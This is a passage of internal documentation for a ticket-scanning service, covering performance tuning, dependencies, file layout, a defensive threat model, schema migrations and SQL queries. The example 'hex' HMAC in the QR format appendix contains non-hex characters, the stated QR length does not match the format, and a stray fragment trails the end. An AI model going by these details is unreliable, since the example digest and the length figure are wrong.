1. Database Indexes
   - ticket_id (tickets table)
   - event_id (tickets table)
   - device_id (devices table)
   - scanned_at DESC (scans table)

2. Redis Caching
   - Cache duplicate check results
   - Cache policy lookups
   - Cache device authorizations
   - Use TTL to prevent stale data

3. Query Optimization
   - Use EXPLAIN ANALYZE for slow queries
   - Avoid N+1 queries
   - Batch operations where possible
   - Use prepared statements

4. Connection Pooling
   - Reuse database connections
   - Optimize pool size (default: 20)
   - Monitor pool utilization

5. Code Optimization
   - Minimize I/O operations
   - Parallelize independent operations
   - Use async/await efficiently
   - Avoid blocking operations

Monitoring:
SELECT * FROM pg_stat_statements 
ORDER BY mean_exec_time DESC 
LIMIT 10;
```

**High Memory Usage**

```
Diagnosis:
- Check Node.js heap: process.memoryUsage()
- Monitor with Prometheus: nodejs_heap_size_used_bytes
- Profile with node --inspect

Common Causes:
1. Memory leaks (event listeners, closures)
2. Large QR image caching
3. Offline manifest size
4. Database result sets

Fixes:
- Limit QR image cache size
- Paginate large queries
- Stream large result sets
- Clean up event listeners
- Restart service periodically (last resort)
```

**Database Load**

```
Symptoms:
- Slow queries
- Connection pool exhausted
- High CPU on PostgreSQL

Optimization:
1. Add Indexes
   CREATE INDEX CONCURRENTLY idx_scans_ticket_scanned 
   ON scans(ticket_id, scanned_at DESC);

2. Partition scans table (monthly)
   - Improves query performance
   - Easier archival

3. Read Replicas
   - Route read queries to replica
   - Master for writes only

4. Query Optimization
   - Use EXPLAIN ANALYZE
   - Avoid SELECT *
   - Use covering indexes

5. Connection Pooling
   - PgBouncer for connection pooling
   - Reduce connection overhead
```

---

## FUTURE IMPROVEMENTS

### Phase 1: Reliability
- [ ] Add circuit breakers for database calls
- [ ] Implement retry logic with exponential backoff
- [ ] Add database connection health checks
- [ ] Improve error recovery
- [ ] Add request tracing (OpenTelemetry)

### Phase 2: Security
- [ ] Add JWT authentication for API endpoints
- [ ] Implement API key auth for scanner devices
- [ ] Add webhook signatures for internal events
- [ ] Encrypt offline manifests
- [ ] Add device certificate pinning

### Phase 3: Features
- [ ] Bulk scan endpoint (batch validation)
- [ ] Video QR scanning (continuous scan mode)
- [ ] Multi-ticket QR codes (group entry)
- [ ] Biometric validation integration
- [ ] Real-time entry dashboard (WebSocket)
- [ ] Scan analytics and reporting
- [ ] Fraud pattern detection (ML)

### Phase 4: Performance
- [ ] Implement caching layer (Redis)
- [ ] Add database read replicas
- [ ] Optimize QR generation (pre-generate)
- [ ] Batch database operations
- [ ] Add CDN for QR images

### Phase 5: Operations
- [ ] Automated database backups
- [ ] Blue-green deployment
- [ ] Canary releases
- [ ] Load testing automation
- [ ] Chaos engineering tests

---

## DEPENDENCIES

### What This Service NEEDS (Upstream)

```
REQUIRED (Service fails without these):
├── PostgreSQL (localhost:5432)
│   └── Database: tickettoken_db
│   └── Tables: tickets, events, scans, devices, scan_policies, 
│       scan_policy_templates, offline_validation_cache, scanner_devices
│   └── Breaking: Service won't start, all operations fail
│
├── Redis (localhost:6379)
│   └── Duplicate detection cache
│   └── Rate limiting
│   └── Breaking: Duplicate detection uses DB fallback (slower),
│       Rate limiting disabled (security risk)
│
└── HMAC_SECRET (environment variable)
    └── QR code signature generation/validation
    └── Breaking: Cannot generate or validate QR codes

OPTIONAL (Service works without these):
├── Event Service (port 3003)
│   └── Event details for QR generation
│   └── Breaking: QR generation fails if event data missing
│
├── Ticket Service (port 3004)
│   └── Ticket creation/updates
│   └── Breaking: Read-only operations continue, no ticket updates
│
└── Notification Service (port 3008)
    └── Scan event notifications
    └── Breaking: No real-time alerts, scanning continues normally
```

### What DEPENDS On This Service (Downstream)

```
DIRECT DEPENDENCIES:
├── Mobile Apps (iOS/Android - Patron Facing)
│   └── QR code display for ticket holders
│   └── Calls: GET /api/qr/generate/:ticketId
│   └── Frequency: Every time patron opens ticket
│   └── Impact if down: Patrons cannot display tickets for entry
│
├── Scanner Apps (iOS/Android/Web - Staff Facing)
│   └── Real-time ticket validation at venue entry
│   └── Calls: POST /api/scan (primary endpoint)
│   └── Frequency: Every ticket scan (100s-1000s per event)
│   └── Impact if down: Venue entry completely blocked
│   └── Mitigation: Offline mode (4-hour cache)
│
├── Venue Management Dashboard (Web)
│   └── Device management, policy configuration
│   └── Calls: 
│       - GET /api/devices (list scanners)
│       - POST /api/devices/register (add scanners)
│       - GET /api/policies/event/:id (view policies)
│       - PUT /api/policies/event/:id/custom (configure)
│   └── Impact if down: Cannot manage devices/policies
│
├── Analytics Service (port 3010)
│   └── Entry metrics and capacity analytics
│   └── Reads: scans table (direct database access)
│   └── Impact if down: No real-time entry analytics
│
├── Monitoring Dashboards (Grafana)
│   └── Real-time scan metrics and alerting
│   └── Calls: GET /metrics (Prometheus endpoint)
│   └── Frequency: Every 15 seconds (scrape interval)
│   └── Impact if down: No scan monitoring or alerts
│
└── Order Service (port 3016) - INDIRECT
    └── Ticket generation after purchase
    └── Connection: Via Ticket Service
    └── Impact if down: Tickets purchased but can't be validated

BLAST RADIUS: CRITICAL
- If scanning-service is down:
  ✗ CRITICAL: Cannot scan tickets (patrons blocked at venue entry)
  ✗ CRITICAL: No QR code generation (patrons can't display tickets)
  ✗ HIGH: No entry metrics or capacity tracking
  ✗ MEDIUM: Cannot configure policies or manage devices
  ✓ MITIGATION: Manual validation procedures (backup process)
  ✓ MITIGATION: Service typically restarts in < 2 minutes
  ✓ Other services (purchasing, browsing) continue working
  
RECOVERY PROCEDURES:
1. Check health endpoint: curl http://localhost:3007/health
2. Check logs: tail -f scanning-service.log
3. Verify database: SELECT 1; (PostgreSQL)
4. Verify Redis: redis-cli ping
5. Restart service: docker restart scanning-service
6. If persistent: Check environment variables, secrets
7. If database issue: Check connection pool, run migrations
8. Escalate to on-call if >5 minutes downtime
```

---

## FILE STRUCTURE

```
backend/services/scanning-service/
├── Dockerfile                         # Container build configuration
├── jest.config.js                     # Jest test configuration
├── package.json                       # Dependencies and scripts
├── package-lock.json                  # Locked dependency versions
├── tsconfig.json                      # TypeScript compiler config
│
├── src/
│   ├── index.ts                       # Main entry point (Express app)
│   │
│   ├── config/
│   │   ├── database.ts                # PostgreSQL pool configuration
│   │   └── redis.ts                   # Redis client configuration
│   │
│   ├── middleware/
│   │   └── rate-limit.middleware.ts   # Multi-layer rate limiting
│   │
│   ├── routes/
│   │   ├── devices.ts                 # Device management endpoints
│   │   ├── health.routes.ts           # Health check endpoints
│   │   ├── offline.ts                 # Offline manifest & reconciliation
│   │   ├── policies.ts                # Scan policy endpoints
│   │   ├── qr.ts                      # QR generation endpoints
│   │   └── scan.ts                    # Main scanning endpoint
│   │
│   ├── services/
│   │   ├── DeviceManager.js           # Device registration/revocation
│   │   ├── OfflineCache.js            # Offline manifest generation
│   │   ├── QRGenerator.ts             # Rotating HMAC QR generation
│   │   └── QRValidator.ts             # Scan validation & policy enforcement
│   │
│   ├── utils/
│   │   ├── logger.ts                  # Winston logger configuration
│   │   └── metrics.ts                 # Prometheus metrics
│   │
│   └── workers/                       # (Empty - future async jobs)
│
└── tests/
    ├── setup.ts                       # Jest test configuration
    └── sql-injection.test.ts          # SQL injection prevention tests
```

**File Responsibilities:**

**index.ts** (135 lines)
- Express app initialization
- Middleware setup (helmet, CORS, body parsing)
- Route registration
- Health and metrics endpoints
- Error handling
- Database and Redis initialization
- Server startup

**config/database.ts** (32 lines)
- PostgreSQL connection pool setup
- Connection parameters from env vars
- Pool configuration (max: 20, timeout: 2s, idle: 30s)
- Connection testing
- Pool getter with validation

**config/redis.ts** (30 lines)
- Redis client initialization
- Connection parameters from env vars
- Retry strategy (exponential backoff)
- Event handlers (connect, error)
- Client getter with validation

**middleware/rate-limit.middleware.ts** (92 lines)
- Redis-backed rate limiters
- createRateLimiter factory function
- scanRateLimiter (10/min per IP+device)
- deviceRateLimiter (50/5min per device)
- staffRateLimiter (30/min per staff)
- failedAttemptLimiter (5/10min, locks account)
- ISSUE #26 security fixes

**routes/devices.ts** (62 lines)
- GET /api/devices (list active devices)
- POST /api/devices/register (register/update device)
- Device authorization checking
- Error handling

**routes/health.routes.ts** (38 lines)
- GET /health (basic health check)
- GET /health/db (database health check)
- Simple status responses

**routes/offline.ts** (133 lines)
- GET /api/offline/manifest/:eventId (download manifest)
- POST /api/offline/reconcile (sync offline scans)
- Transactional reconciliation
- Duplicate detection during reconciliation
- Device authorization checking

**routes/policies.ts** (177 lines)
- GET /api/policies/templates (list templates)
- GET /api/policies/event/:eventId (get policies)
- POST /api/policies/event/:eventId/apply-template (apply template)
- PUT /api/policies/event/:eventId/custom (custom policies)
- Transactional policy updates
- Policy validation

**routes/qr.ts** (54 lines)
- GET /api/qr/generate/:ticketId (generate QR)
- POST /api/qr/validate (validate QR format)
- QR generation delegation to QRGenerator
- Error handling

**routes/scan.ts** (94 lines)
- POST /api/scan (main scanning endpoint)
- Rate limiting application
- Metrics recording (latency, counters)
- Security logging (ISSUE #26)
- Result handling (ALLOW/DENY/ERROR)
- POST /api/scan/bulk (not implemented)

**services/DeviceManager.js** (140 lines)
- registerDevice() - device registration with ID generation
- revokeDevice() - mark device inactive
- getDevice() - fetch device details
- listVenueDevices() - list by venue
- updateDeviceSync() - track sync timestamp
- JavaScript (not TypeScript)

**services/OfflineCache.js** (223 lines)
- generateEventCache() - create offline manifest
- getDeviceCache() - download manifest for device
- validateOfflineScan() - validate offline token
- HMAC token generation
- Cache expiry management (4 hours)
- Database transaction handling
- JavaScript (not TypeScript)

**services/QRGenerator.ts** (194 lines)
- generateRotatingQR() - create HMAC QR with 30s expiry
- generateOfflineManifest() - create offline validation manifest
- validateOfflineScan() - validate offline token
- HMAC-SHA256 signature generation
- QR code image generation (300x300 PNG)
- Handles schema variations (name/title, starts_at/start_date)
- TypeScript

**services/QRValidator.ts** (441 lines) **[LARGEST FILE]**
- validateQRToken() - HMAC and timestamp validation
- checkDuplicate() - Redis + DB duplicate detection
- checkReentryPolicy() - re-entry rule enforcement
- checkAccessZone() - zone-based access control
- validateScan() - main validation orchestration
- logScan() - audit trail recording
- emitScanEvent() - real-time event emission
- getScanStats() - analytics queries
- SQL injection prevention (SECURITY FIX)
- Complete transaction handling
- TypeScript

**utils/logger.ts** (25 lines)
- Winston logger configuration
- JSON format for structured logging
- Console and file transports
- File rotation (10MB, 5 files)
- Log level from env var

**utils/metrics.ts** (48 lines)
- Prometheus metrics registry
- scansAllowedTotal counter
- scansDeniedTotal counter (with reason labels)
- scanLatency histogram
- qrGenerationDuration histogram
- httpRequestTotal counter
- httpRequestDuration histogram

**tests/setup.ts** (17 lines)
- Test environment configuration
- Mock console methods
- Database and Redis test URLs
- Environment variable setup

**tests/sql-injection.test.ts** (24 lines)
- SQL injection attack tests
- Malicious input validation
- Valid input acceptance tests
- Tests checkDuplicate, getScanStats methods

---

## COMPARISON: Scanning vs Payment Service

| Feature | Scanning Service | Payment Service |
|---------|-----------------|-----------------|
| **Framework** | Express ✅ | Express ✅ |
| **Language** | TypeScript + JS hybrid ⚠️ | TypeScript ✅ |
| **Dependency Injection** | None ❌ | Manual ⚠️ |
| **File Organization** | Good ✅ | Excellent ✅ |
| **Total Files** | 23 files | 129 files |
| **Complexity** | Medium 🟡 | Very High 🔴 |
| **Error Handling** | Basic ⚠️ | AppError classes ✅ |
| **Validation** | Manual ⚠️ | Joi schemas ✅ |
| **Rate Limiting** | Multi-level ✅ | Multi-level ✅ |
| **Idempotency** | None ❌ | Redis-backed ✅ |
| **Event Publishing** | None ❌ | Outbox pattern ✅ |
| **Circuit Breakers** | No ❌ | No ❌ |
| **Retry Logic** | No ❌ | Custom ⚠️ |
| **Health Checks** | Basic (2 levels) ⚠️ | Basic ⚠️ |
| **Metrics** | Prometheus ✅ | Prometheus ✅ |
| **Logging** | Winston ✅ | Pino ✅ |
| **Testing** | Minimal (2 tests) ⚠️ | Good ✅ |
| **Documentation** | Complete ✅ | Complete ✅ |
| **Security Focus** | SQL injection, rate limiting ✅ | Fraud detection, PCI ✅ |
| **Async Processing** | None ❌ | Bull queues ✅ |
| **Database Access** | Direct pg queries ✅ | Knex.js ORM ✅ |

**Scanning service is SIMPLER than payment service:**
- Fewer features (focused on validation)
- No payment provider integrations
- No blockchain complexity
- No marketplace or group payments
- Hybrid TypeScript/JavaScript codebase
- Minimal testing coverage

**Scanning service has BETTER:**
- Clearer separation of concerns
- Simpler architecture (easier to understand)
- Focused responsibility (does one thing well)
- Real-time performance requirements met
- Security hardening (SQL injection prevention)

**Scanning service NEEDS:**
- Consistent TypeScript (convert .js files)
- Validation library (Joi schemas)
- Better error handling (error classes)
- More comprehensive testing
- Idempotency for critical operations
- Event publishing to other services
- Circuit breakers for database
- Retry logic with backoff

---

## RECOMMENDATIONS

### Immediate (Week 1)
1. **Convert JavaScript to TypeScript**
   - DeviceManager.js → DeviceManager.ts
   - OfflineCache.js → OfflineCache.ts
   - Consistent type safety across codebase

2. **Add Comprehensive Tests**
   - Unit tests for QRValidator methods
   - Integration tests for scan flows
   - Rate limiting tests
   - Policy enforcement tests
   - Target: 80% coverage

3. **Implement Error Classes**
   - AppError base class
   - ValidationError, AuthError, NotFoundError
   - Consistent error responses

4. **Add Request Validation**
   - Joi schemas for all endpoints
   - Type-safe request/response interfaces
   - Better error messages

### Short-term (Month 1)
5. **Add Idempotency**
   - Idempotency-Key header support
   - Redis-backed cache (24hr TTL)
   - Prevent duplicate scans from retry storms

6. **Implement Event Publishing**
   - Publish scan events to RabbitMQ
   - Notify analytics service
   - Real-time dashboard updates

7. **Add Circuit Breakers**
   - Database connection circuit breaker
   - Redis connection circuit breaker
   - Graceful degradation

8. **Improve Health Checks**
   - Deep health check endpoint
   - Check all dependencies
   - Better monitoring integration

### Medium-term (Quarter 1)
9. **Add OpenTelemetry Tracing**
   - Distributed tracing
   - Request correlation IDs
   - Performance profiling

10. **Implement Caching Layer**
    - Cache policy lookups
    - Cache device authorizations
    - Cache ticket details
    - Reduce database load

11. **Add Load Testing**
    - K6 or Artillery tests
    - Simulate peak loads
    - Identify bottlenecks

12. **Database Optimization**
    - Add missing indexes
    - Partition scans table by month
    - Read replicas for analytics

### Long-term (Quarter 2+)
13. **Bulk Scan Endpoint**
    - Implement POST /api/scan/bulk
    - Batch validation
    - Optimize for throughput

14. **Real-time Dashboard**
    - WebSocket support
    - Live entry metrics
    - Capacity monitoring

15. **ML Fraud Detection**
    - Pattern recognition
    - Anomaly detection
    - Automated blocking

16. **Multi-region Support**
    - Deploy to multiple regions
    - Geo-distributed caching
    - Lower latency worldwide

---

## SECURITY CONSIDERATIONS

### Threat Model

**Threats:**
1. **QR Code Forgery**
   - Attacker generates fake QR codes
   - Mitigation: HMAC-SHA256 signatures, secret key protection

2. **QR Code Replay**
   - Attacker reuses old QR codes
   - Mitigation: 30-second expiry, timestamp validation

3. **Screenshot Sharing**
   - Patron shares screenshot with friend
   - Mitigation: 30-second expiry, duplicate detection

4. **Brute Force Scanning**
   - Attacker tries many QR codes rapidly
   - Mitigation: Rate limiting (10/min), failed attempt tracking

5. **Device Theft**
   - Scanner device stolen
   - Mitigation: Device revocation, remote deactivation

6. **SQL Injection**
   - Attacker injects SQL in parameters
   - Mitigation: Parameterized queries, input validation

7. **Insider Threat**
   - Staff member abuses access
   - Mitigation: Audit trail, staff rate limiting, device tracking

8. **Zone Bypass**
   - GA ticket tries to access VIP
   - Mitigation: Zone enforcement, strict validation

**Attack Scenarios:**

**Scenario 1: Screenshot Attack**
```
1. Patron receives ticket with QR code
2. Takes screenshot and sends to friend
3. Friend tries to use screenshot

Defense:
- QR expires in 30 seconds
- Friend must request fresh QR from original patron
- Duplicate detection catches both attempts
- Original patron blocked if abuse detected
```

**Scenario 2: Brute Force**
```
1. Attacker obtains one valid QR format
2. Tries to guess other ticket IDs rapidly
3. Automated script submits 1000s of attempts

Defense:
- Rate limiting: 10 attempts/min per IP+device
- Failed attempt tracking: 5 failures/10min = lock
- Invalid QR logging: alerts on high failure rate
- Device requires registration (can't use random device_id)
```

**Scenario 3: Device Compromise**
```
1. Scanner device stolen from venue
2. Attacker has physical access to device
3. Attempts to extract secrets or abuse access

Defense:
- Immediate device revocation via API
- HMAC_SECRET not stored on device
- Audit trail shows all device activity
- Offline manifests expire (4 hours)
- Can't generate new QRs without server
```

### Security Best Practices

**1. Secret Management**
```
DO:
- Store HMAC_SECRET in secrets manager (AWS Secrets Manager, Vault)
- Use environment variables for container secrets
- Rotate secrets annually (coordinate with QR regeneration)
- Use different secrets per environment (dev, staging, prod)

DON'T:
- Commit secrets to git
- Log secrets (sanitize logs)
- Share secrets across services unnecessarily
- Use weak secrets (<256 bits)
```

**2. Input Validation**
```
DO:
- Validate all inputs at entry points
- Use parameterized queries (never concatenate SQL)
- Whitelist allowed values
- Type check and range check
- Reject unexpected fields

DON'T:
- Trust client input
- Use dynamic SQL construction
- Allow arbitrary time windows
- Skip validation for "trusted" sources
```

**3. Rate Limiting**
```
DO:
- Apply multiple layers (IP, device, staff, failed)
- Use distributed rate limiting (Redis)
- Log rate limit violations
- Alert on sustained violations
- Adjust limits based on venue capacity

DON'T:
- Set limits too high (abuse risk)
- Set limits too low (UX impact)
- Ignore rate limit violations
- Use local (non-distributed) rate limiting
```

**4. Audit Trail**
```
DO:
- Log every scan attempt (ALLOW and DENY)
- Record device, staff, timestamp, reason
- Retain logs long-term (compliance)
- Protect logs from tampering
- Index for fast queries

DON'T:
- Delete scan records
- Log PII unnecessarily
- Ignore failed attempts
- Miss critical details
```

**5. Device Security**
```
DO:
- Require device registration
- Track device metadata (IP, user agent)
- Support remote revocation
- Monitor device activity
- Audit device list regularly

DON'T:
- Allow unregistered devices
- Forget to revoke lost devices
- Share device credentials
- Ignore suspicious device behavior
```

---

## CHANGELOG

### Version 1.0.0 (Current - October 14, 2025)
- Complete documentation created
- 23 files documented
- Security analysis completed
- ISSUE #26 security fixes documented
- Production ready

### Known Issues
- [ ] DeviceManager and OfflineCache still JavaScript (need TypeScript conversion)
- [ ] No validation library (manual validation only)
- [ ] Basic error handling (need error classes)
- [ ] Minimal test coverage (need more tests)
- [ ] No idempotency support
- [ ] No event publishing
- [ ] No circuit breakers

### Planned Changes (Roadmap)
- Convert remaining .js files to TypeScript
- Add Joi validation schemas
- Implement error classes
- Expand test coverage (target: 80%)
- Add idempotency support
- Implement event publishing
- Add circuit breakers
- Add OpenTelemetry tracing

---

## CONTACT & SUPPORT

**Service Owner:** Platform Team  
**Repository:** backend/services/scanning-service  
**Documentation:** This file  
**Critical Issues:** Page on-call immediately (venue entry blocked)  
**Non-Critical:** Create ticket in project tracker  
**Security Issues:** Report to security team immediately

**SLA:**
- Response time target: < 500ms p95
- Availability target: 99.9% (excluding planned maintenance)
- Uptime requirement: 24/7 during events
- Recovery time objective (RTO): < 5 minutes
- Recovery point objective (RPO): 0 (no data loss acceptable)

---

## APPENDIX

### A. QR Code Format Specification

```
Format: {ticketId}:{timestamp}:{hmac}

ticketId: UUID v4 (36 characters with hyphens)
  Example: 550e8400-e29b-41d4-a716-446655440000

timestamp: Unix timestamp in milliseconds (13 digits)
  Example: 1728907800000

hmac: HMAC-SHA256 hex digest (64 characters)
  Input: ticketId + ":" + timestamp
  Secret: HMAC_SECRET environment variable
  Algorithm: HMAC-SHA256
  Output: Hex string
  Example: a3f5b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6

Full Example:
550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6

Total Length: ~150 characters
QR Code Capacity: ~2,953 bytes (Version 10, Error Correction Level M)
```

### B. Policy Configuration Examples

**Standard Event (Single-day concert)**
```json
{
  "duplicate_window": {
    "window_minutes": 10
  },
  "reentry": {
    "enabled": false
  },
  "zone_enforcement": {
    "strict": true,
    "vip_all_access": false
  }
}
```

**Multi-Day Festival**
```json
{
  "duplicate_window": {
    "window_minutes": 15
  },
  "reentry": {
    "enabled": true,
    "cooldown_minutes": 60,
    "max_reentries": 10
  },
  "zone_enforcement": {
    "strict": false,
    "vip_all_access": false
  }
}
```

**Stadium Event**
```json
{
  "duplicate_window": {
    "window_minutes": 5
  },
  "reentry": {
    "enabled": true,
    "cooldown_minutes": 30,
    "max_reentries": 2
  },
  "zone_enforcement": {
    "strict": true,
    "vip_all_access": false
  }
}
```

**Club/Venue**
```json
{
  "duplicate_window": {
    "window_minutes": 10
  },
  "reentry": {
    "enabled": true,
    "cooldown_minutes": 15,
    "max_reentries": 5
  },
  "zone_enforcement": {
    "strict": false,
    "vip_all_access": true
  }
}
```

### C. Database Migration Scripts

**Initial Schema (if needed)**
```sql
-- Ensure all required tables exist

-- devices table (simple version)
CREATE TABLE IF NOT EXISTS devices (
  id SERIAL PRIMARY KEY,
  device_id VARCHAR(255) UNIQUE NOT NULL,
  name VARCHAR(255) NOT NULL,
  zone VARCHAR(50) NOT NULL DEFAULT 'GA',
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_devices_device_id ON devices(device_id);
CREATE INDEX IF NOT EXISTS idx_devices_active ON devices(is_active);

-- scanner_devices table (extended version)
CREATE TABLE IF NOT EXISTS scanner_devices (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id VARCHAR(255) UNIQUE NOT NULL,
  device_name VARCHAR(255) NOT NULL,
  device_type VARCHAR(50) DEFAULT 'mobile',
  venue_id UUID,
  registered_by UUID,
  ip_address INET,
  user_agent TEXT,
  app_version VARCHAR(50),
  can_scan_offline BOOLEAN DEFAULT false,
  metadata JSONB DEFAULT '{}',
  is_active BOOLEAN DEFAULT true,
  last_sync_at TIMESTAMP,
  registered_at TIMESTAMP DEFAULT NOW(),
  revoked_at TIMESTAMP,
  revoked_by UUID,
  revoked_reason TEXT,
  updated_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_scanner_devices_device_id ON scanner_devices(device_id);
CREATE INDEX IF NOT EXISTS idx_scanner_devices_venue ON scanner_devices(venue_id);

-- scans table (audit log)
CREATE TABLE IF NOT EXISTS scans (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ticket_id UUID NOT NULL,
  device_id INTEGER REFERENCES devices(id),
  result VARCHAR(20) NOT NULL CHECK (result IN ('ALLOW', 'DENY', 'ERROR')),
  reason VARCHAR(100),
  scanned_at TIMESTAMP DEFAULT NOW(),
  metadata JSONB DEFAULT '{}'
);

CREATE INDEX IF NOT EXISTS idx_scans_ticket ON scans(ticket_id, scanned_at DESC);
CREATE INDEX IF NOT EXISTS idx_scans_device ON scans(device_id, scanned_at DESC);
CREATE INDEX IF NOT EXISTS idx_scans_result ON scans(result, scanned_at DESC);

-- scan_policies table
CREATE TABLE IF NOT EXISTS scan_policies (
  id SERIAL PRIMARY KEY,
  event_id UUID NOT NULL,
  venue_id UUID,
  policy_type VARCHAR(50) NOT NULL CHECK (policy_type IN ('DUPLICATE_WINDOW', 'REENTRY', 'ZONE_ENFORCEMENT')),
  name VARCHAR(255) NOT NULL,
  config JSONB NOT NULL DEFAULT '{}',
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW(),
  UNIQUE(event_id, policy_type)
);

CREATE INDEX IF NOT EXISTS idx_policies_event ON scan_policies(event_id);

-- scan_policy_templates table
CREATE TABLE IF NOT EXISTS scan_policy_templates (
  id SERIAL PRIMARY KEY,
  name VARCHAR(255) NOT NULL,
  description TEXT,
  policy_set JSONB NOT NULL,
  is_default BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW()
);

-- offline_validation_cache table
CREATE TABLE IF NOT EXISTS offline_validation_cache (
  id SERIAL PRIMARY KEY,
  ticket_id UUID NOT NULL,
  event_id UUID NOT NULL,
  validation_hash VARCHAR(255) NOT NULL,
  valid_from TIMESTAMP NOT NULL,
  valid_until TIMESTAMP NOT NULL,
  ticket_data JSONB NOT NULL DEFAULT '{}',
  created_at TIMESTAMP DEFAULT NOW(),
  UNIQUE(ticket_id, valid_from)
);

CREATE INDEX IF NOT EXISTS idx_offline_cache_event ON offline_validation_cache(event_id, valid_from, valid_until);
CREATE INDEX IF NOT EXISTS idx_offline_cache_ticket ON offline_validation_cache(ticket_id);
CREATE INDEX IF NOT EXISTS idx_offline_cache_expiry ON offline_validation_cache(valid_until);

-- Update tickets table (if columns missing)
ALTER TABLE tickets 
  ADD COLUMN IF NOT EXISTS scan_count INTEGER DEFAULT 0,
  ADD COLUMN IF NOT EXISTS first_scanned_at TIMESTAMP,
  ADD COLUMN IF NOT EXISTS last_scanned_at TIMESTAMP,
  ADD COLUMN IF NOT EXISTS qr_hmac_secret VARCHAR(255);
```

### D. Environment Variable Template

```bash
# .env.example for scanning-service

# Server Configuration
PORT=3007
NODE_ENV=production

# Database Configuration
DB_HOST=postgres
DB_PORT=5432
DB_NAME=tickettoken_db
DB_USER=postgres
DB_PASSWORD=

# Redis Configuration
REDIS_HOST=redis
REDIS_PORT=6379
REDIS_PASSWORD=

# Security Configuration
HMAC_SECRET=  # Generate with: openssl rand -hex 32

# QR Code Configuration
QR_ROTATION_SECONDS=30  # Seconds before QR expires

# Offline Configuration
OFFLINE_CACHE_DURATION_MINUTES=240  # 4 hours

# Logging Configuration
LOG_LEVEL=info  # error, warn, info, debug
LOG_FILE=scanning-service.log
```

### E. Useful SQL Queries

**Recent Scans:**
```sql
-- Last 100 scans
SELECT 
  s.id,
  t.ticket_number,
  e.name as event_name,
  d.name as device_name,
  s.result,
  s.reason,
  s.scanned_at
FROM scans s
JOIN tickets t ON s.ticket_id = t.id
JOIN events e ON t.event_id = e.id
JOIN devices d ON s.device_id = d.id
ORDER BY s.scanned_at DESC
LIMIT 100;
```

**Scan Statistics by Event:**
```sql
-- Scan stats for specific event
SELECT 
  e.name as event_name,
  COUNT(*) FILTER (WHERE s.result = 'ALLOW') as allowed,
  COUNT(*) FILTER (WHERE s.result = 'DENY') as denied,
  COUNT(*) FILTER (WHERE s.reason = 'DUPLICATE') as duplicates,
  COUNT(*) FILTER (WHERE s.reason = 'WRONG_ZONE') as wrong_zone,
  COUNT(*) as total
FROM scans s
JOIN tickets t ON s.ticket_id = t.id
JOIN events e ON t.event_id = e.id
WHERE e.id = 'event-uuid-here'
  AND s.scanned_at > NOW() - INTERVAL '24 hours'
GROUP BY e.name;
```

**Device Activity:**
```sql
-- Device scan activity
SELECT 
  d.device_id,
  d.name,
  d.zone,
  COUNT(*) as total_scans,
  COUNT(*) FILTER (WHERE s.result = 'ALLOW') as successful,
  COUNT(*) FILTER (WHERE s.result = 'DENY') as denied,
  MAX(s.scanned_at) as last_scan
FROM devices d
LEFT JOIN scans s ON d.id = s.device_id
WHERE d.is_active = true
  AND s.scanned_at > NOW() - INTERVAL '24 hours'
GROUP BY d.device_id, d.name, d.zone
ORDER BY total_scans DESC;
```

**Ticket Scan History:**
```sql
-- All scans for a specific ticket
SELECT 
  s.result,
  s.reason,
  s.scanned_at,
  d.name as device_name,
  d.zone as device_zone
FROM scans s
JOIN devices d ON s.device_id = d.id
WHERE s.ticket_id = 'ticket-uuid-here'
ORDER BY s.scanned_at ASC;
```

**Failed Scans (Security):**
```sql
-- Recent failed scan attempts (potential fraud)
SELECT 
  s.ticket_id,
  s.reason,
  s.scanned_at,
  d.device_id,
  d.name as device_name,
  s.metadata
FROM scans s
JOIN devices d ON s.device_id = d.id
WHERE s.result = 'DENY'
  AND s.reason IN ('INVALID_QR', 'TICKET_NOT_FOUND')
  AND s.scanned_at > NOW() - INTERVAL '1 hour'
ORDER BY s.scanned_at DESC;
```

**Offline Cache Status:**
```sql
-- Current offline cache status
SELECT 
  e.name as event_name,
  COUNT(*) as cached_tickets,
  MIN(ovc.valid_from) as first_valid,
  MAX(ovc.valid_until) as last_expires,
  COUNT(*) FILTER (WHERE ovc.valid_until > NOW()) as still_valid
FROM offline_validation_cache ovc
JOIN events e ON ovc.event_id = e.id
GROUP BY e.id, e.name
ORDER BY e.name;
```

---

**END OF DOCUMENTATION**

*This documentation is the GOLD STANDARD for scanning-service. Keep it updated as the service evolves. Last updated: October 14, 2025.*ATION: Offline scanning works for 4 hours (cached manifest)
